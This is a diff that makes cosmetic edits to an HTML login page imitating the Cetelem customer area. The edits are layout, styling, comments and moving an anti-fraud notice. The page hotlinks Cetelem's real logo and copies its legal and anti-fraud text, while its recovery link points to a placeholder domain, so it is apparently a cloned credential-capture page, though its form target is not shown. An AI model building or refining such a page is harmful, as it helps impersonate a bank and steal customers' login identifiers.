@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Connexion - Espace client</title>
+  <title>Connexion – Espace client</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     /* Styles existants */
@@ -42,6 +42,7 @@
       box-shadow: 0 0 12px rgba(0, 0, 0, 0.15);
       text-align: center;
       box-sizing: border-box;
+      min-height: 400px;
     }
 
     .login-box img {
@@ -208,7 +209,7 @@
         font-size: 16px;
       }
 
-      .btn {
+      .btn-suivant {
         font-size: 14px;
       }
 
@@ -224,6 +225,8 @@
       bottom: 0;
       left: 0;
       width: 100%;
+      max-height: 50vh;
+      overflow-y: auto;
       background-color: #f7f7f7;
       border-top: 1px solid #e0e0e0;
       padding: 20px;
@@ -327,13 +330,14 @@
 <body>
 
   <div class="logo">
-    <img src="https://www.cetelem.fr/brand/logo.svg">
+    <img src="https://www.cetelem.fr/brand/logo.svg" alt="Logo Cetelem">
   </div>
 
   <div class="subtext">
     <strong>Un crédit vous engage et doit être remboursé.</strong> Vérifiez vos capacités de remboursement avant de vous engager.
   </div>
 
+  <!-- Bloc principal -->
   <div class="login-box">
     <div class="avatar" style="margin-bottom: 18px;">
       <svg width="60" height="60" viewBox="0 0 26.6666668 26.6666668" xmlns="http://www.w3.org/2000/svg" fill="#014421">
@@ -350,8 +354,7 @@
         <span class="checkmark" id="check-icon">✅</span>
       </div>
 
-      <div id="info-message" style="
-        display: none;
+      <div id="info-message" style="display: none;
         background-color: #d6f0ff;
         color: #084d6e;
         padding: 10px;
@@ -371,19 +374,20 @@
         </label>
       </div>
 
-      <button class="btn btn-suivant" type="submit" id="btn-suiv" disabled>Suivant</button>
+      <button class="btn-suivant" type="submit" id="btn-suiv" disabled>Suivant</button>
     </form>
 
     <div class="forgot">
       <a href="https://exemple.com/recuperation" class="btn-forgot">Identifiant oublié</a>
     </div>
+  </div>
 
-    <div class="alert-box">
-      <strong>⚠️ Contre la fraude, adoptez les bons réflexes</strong><br>
-      Ne communiquez jamais vos informations personnelles (identifiant, numéro de carte Cpay, code secret, etc.) par téléphone, email, chat ou réseaux sociaux. JAMAIS Cetelem ne vous les demandera.
-      <br>
-      <button>Découvrez nos conseils →</button>
-    </div>
+  <!-- Bloc alerte séparé -->
+  <div class="alert-box">
+    <strong>⚠️ Contre la fraude, adoptez les bons réflexes</strong><br>
+    Ne communiquez jamais vos informations personnelles (identifiant, numéro de carte Cpay, code secret, etc.) par téléphone, email, chat ou réseaux sociaux. JAMAIS Cetelem ne vous les demandera.
+    <br>
+    <button>Découvrez nos conseils →</button>
   </div>
 
   <footer>
@@ -423,7 +427,7 @@
   </div>
 
   <script>
-    // Script pour le champ d'identifiant et le bouton
+    // Script champ identifiant + bouton
     const identifiantInput = document.getElementById('identifiant');
     const btnSuivant = document.getElementById('btn-suiv');
     const checkIcon = document.getElementById('check-icon');
@@ -433,7 +437,6 @@
       const value = identifiantInput.value.trim();
       const length = value.length;
 
-      // Logique pour le bouton et l'icône de validation
       if (length >= 8 && length <= 10) {
         btnSuivant.classList.add('active');
         btnSuivant.disabled = false;
@@ -446,7 +449,6 @@
         checkIcon.style.display = 'none';
       }
 
-      // Logique pour le message d'info (affiche dès la 1ère saisie)
       if (length > 0) {
         infoMessage.style.display = 'block';
       } else {
@@ -454,7 +456,7 @@
       }
     });
 
-    // NOUVEAU: Script pour la bannière de cookies
+    // Script bannière cookies
     const cookieBanner = document.getElementById('cookieBanner');
     const acceptAllCookiesBtn = document.getElementById('acceptAllCookies');
     const gererMesChoixBtn = document.querySelector('.btn-gerer');
@@ -473,10 +475,10 @@
     });
 
     if (gererMesChoixBtn) {
-        gererMesChoixBtn.addEventListener('click', () => {
-            localStorage.setItem('cookiesAccepted', 'true');
-            hideCookieBanner();
-        });
+      gererMesChoixBtn.addEventListener('click', () => {
+        localStorage.setItem('cookiesAccepted', 'true');
+        hideCookieBanner();
+      });
     }
   </script>
 
